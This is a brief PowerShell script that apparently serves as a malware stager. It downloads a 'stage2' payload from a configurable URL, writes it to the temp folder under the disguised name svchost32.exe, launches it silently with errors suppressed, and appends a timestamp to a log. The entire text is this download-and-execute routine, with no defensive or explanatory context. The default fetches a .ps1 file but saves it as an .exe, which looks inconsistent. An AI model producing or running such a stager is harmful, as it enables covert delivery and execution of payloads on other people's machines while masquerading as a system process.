
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://localhost:8080/stage2.ps1',
    [string]$WorkingPath = "$env:TEMP\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $WorkingPath)
Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
